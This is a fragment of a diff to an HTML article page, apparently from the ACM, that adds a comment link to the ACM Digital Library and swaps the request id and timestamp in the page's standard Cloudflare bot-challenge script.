+	Comment on this article in the <a href="http://portal.acm.org/citation.cfm?id=3786614">ACM Digital Library</a>
+	
+	</p>
+	
 
 
 
@@ -602,5 +905,5 @@ More related articles:
 
 
 
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9c9a6f54cf535541',t:'MTc3MDM3ODY3OC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9cc3dccd1e68da9a',t:'MTc3MDgxMzA3OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
